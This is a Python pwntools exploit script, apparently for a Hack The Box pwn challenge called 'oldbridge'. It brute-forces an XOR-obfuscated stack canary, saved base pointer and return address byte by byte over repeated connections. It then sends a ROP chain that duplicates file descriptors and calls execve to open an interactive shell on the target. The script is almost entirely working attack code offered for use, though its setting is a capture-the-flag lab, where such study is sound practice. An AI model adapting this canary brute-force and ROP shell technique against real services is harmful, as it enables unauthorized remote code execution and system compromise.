from pwn import *


host = "127.0.0.1"
port = "123"
bin_path = "/root/Desktop/HTB/Challnges/pwn/oldbridge/oldbridge"

class brutefoce:
    offset = 0
    chunk = "davide" + "A" * (1032 - 6)
    xor_rbp= ""
    rbp    = ""
    canary = ""
    xor_canary = ""
    rbp_real = ""
    xor_rbp_real = ""
    xor_rip = "\xde"
    rip1 = chr(0xde ^ 0xd)
    def __init__(self,offset):
        self.offset = offset

        self.canary()

        self.xor_canary = u64(self.xor_rbp[:8])
        self.canary = u64(self.rbp[:8])
        self.xor_rbp_real = u64(self.xor_rbp[8:])
        self.rbp_real = u64(self.rbp[8:])
        self.rip()
        self.xor_rip = u64(self.xor_rip+"\x00")
        self.rip1     = u64(self.rip1+"\x00")

    def xor(self,txt):
        res = ""
        for x in  txt:
            res += chr(ord(x)^0xd)
        return res
    def recv(self,connect):
        try :
            rec = connect.recv(timeout=0.02)
        except:
            return False
        return  True
    def remote1(self):
        try:
            r = remote(host, port, level="error")

        except:
            print("error for connection try again ...")
            exit()
        return  r
    def canary(self):
        log.info("starting burtefoce canary :-) ")
        while len(self.xor_rbp) < 16:
            word = 0x00
            if len(self.xor_rbp) == 9: log.info("starting burtefoce rbp :-) ")
            while word < 0xff:

                r = self.remote1()
                #r = remote(host,port,level="error")
                payload  = self.chunk + self.xor_rbp + chr(word)

                r.sendafter("Username: ",payload)

                rec = self.recv(r)
                if rec:
                    self.xor_rbp += chr(word)
                    self.rbp     += self.xor(chr(word))
                    log.success("Found byte {}".format(hex(word)))
                    r.close()
                    break
                else:
                    word += 1
                    r.close()
    def rip(self):
        self.chunk += self.xor_rbp
        log.info("starting burtefoce return address :-) ")
        while len(self.xor_rip) < 7 :
            word = 0x00
            while word  < 0xff:
                r = self.remote1()
                payload = self.chunk + self.xor_rip + chr(word)
                r.sendafter("Username: ",payload)
                rec = self.recv(r)
                if rec:
                    self.xor_rip += chr(word)
                    self.rip1    += self.xor(chr(word))
                    log.success("Fonud byte {}".format(hex(word)))
                    r.close()
                    break
                else:
                    word += 1
                    r.close()




r = brutefoce(1032)

log.success("Adress xor rbp is    : {}".format(hex(r.xor_rbp_real)))
log.success("Adress rbp is        : {}".format(hex(r.rbp_real)))
log.success("Adress xor canary is : {}".format(hex(r.xor_canary)))
log.success("Adress canary is     : {}".format(hex(r.canary)))
log.success("Adress xor rip is    : {}".format(hex(r.xor_rip)))
log.success("Adress rip is        : {}".format(hex(r.rip1)))

def getshell():
    log.info("Trying Get shell ...")
    # rsp=0x479
    # ret_add=0xed3
    try:
        bin = ELF(bin_path,checksec=False)
    except:
        log.info("path binary file  is incorrect ")
        exit()

    rip = r.rip1 - 0xed3
    bin.address = rip
    rsp = r.rbp_real - 0x479 + 0x8

    # make rop
    # sys_dup1
    chunk = "davideA" + p64(0xd657e2263646f22)
    payload = ""
    payload += p64(rsp)
    payload += p64(0x0000000000000f73 + bin.address)
    payload += p64(0x4)
    payload += p64(0x0000000000000f71 + bin.address)
    payload += p64(0x0)
    payload += "A" * 8
    payload += p64(0x0000000000000b51 + bin.address)
    payload += p64(33)
    payload += p64(0x0000000000000b55 + bin.address)

    # sys_dup2

    payload += p64(0x0000000000000f73 + bin.address)
    payload += p64(0x4)
    payload += p64(0x0000000000000f71 + bin.address)
    payload += p64(0x1)
    payload += "A" * 8
    payload += p64(0x0000000000000b51 + bin.address)
    payload += p64(33)
    payload += p64(0x0000000000000b55 + bin.address)

    # sys_execute

    payload += p64(0x0000000000000b53 + bin.address)
    payload += p64(0x0)
    payload += p64(0x0000000000000f71 + bin.address)
    payload += p64(0x0)
    payload += "A" * 8
    payload += p64(0x0000000000000f73 + bin.address)
    payload += p64(r.rbp_real - 0x479)
    payload += p64(0x0000000000000b51 + bin.address)
    payload += p64(59)
    payload += p64(0x0000000000000b55 + bin.address)

    payload += "A" * (1032 - len(payload + chunk))

    payload += p64(r.canary)

    payload += p64(rsp)
    payload += p64(0x0000000000000b6d + bin.address)

    m = remote(host, port)
    m.sendafter("Username: ", chunk + r.xor(payload))


    m.interactive()

getshell()